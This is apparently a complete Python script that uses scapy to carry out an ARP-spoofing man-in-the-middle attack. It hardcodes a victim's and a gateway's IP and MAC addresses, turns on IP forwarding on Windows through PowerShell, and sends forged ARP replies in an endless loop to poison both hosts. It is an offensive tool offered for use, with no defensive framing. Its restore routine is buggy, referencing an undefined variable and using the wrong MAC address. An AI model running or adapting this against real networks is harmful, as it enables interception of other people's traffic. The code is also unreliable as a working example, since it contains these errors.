from scapy.all import *
import sys
import os
import time

try:
	interface = "Wi-Fi"
	victimeIP = "192.168.1.100"
	gateIP = "192.168.1.104"
except KeyboardInterrupt:
	print("[!] User Requested Shutdown!")
	print("[!] Exiting...")
	sys.exit(1)

print("[^] Enabling IP forwarding...")
os.system('pwsh -Command Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -Name IPEnableRouter -Value "1"')



def reARP():
	print("[^] Restoring Targets...")
	victimeMAC = "B4-6B-FC-C1-4F-E4"
	gateMAC = "52-38-57-63-6E-F4"
	send(ARP(op=2, pdst=gataIP, psrc=victimeIP, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimeMAC),count=7)
	send(ARP(op=2, pdst=victimeIP, psrc=gataIP, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimeMAC),count=7)
	print("[^] Disabling IP forwarding...")
	os.system('pwsh -Command Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -Name IPEnableRouter -Value "0"')
	print("[^] Shutting Down...")
	sys.exit(1)


def trick(gm,vm):
    send(ARP(op=2,pdst=victimeIP,psrc=gateIP,hwdst=gm))
    send(ARP(op=2,pdst=gateIP,psrc=victimeIP,hwdst=vm))
    
def mitm():
    try:
        victimeMac = "B4-6B-FC-C1-4F-E4"
    except Exception:
        print("[^] Couldn't Find Victim Mac Address")
        print("[^] Disabling IP forwarding...")
        os.system('pwsh -Command Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -Name IPEnableRouter -Value "0"')
        print("[^] Shutting Down...")
        sys.exit(1)
    try:
        gateMac = "52-38-57-63-6E-F4"
    except Exception:
        print("[^] Couldn't Find Victim Mac Address")
        print("[^] Disabling IP forwarding...")
        os.system('pwsh -Command Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -Name IPEnableRouter -Value "0"')
        print("[^] Shutting Down...")
        sys.exit(1)
        
    print("[^] Poisoning Targets...")
    while True:
    	try:
        	trick(gateMac,victimeMac)
        	time.sleep(1.5)
    	except KeyboardInterrupt:
        	reARP()
        	break
        
        
mitm()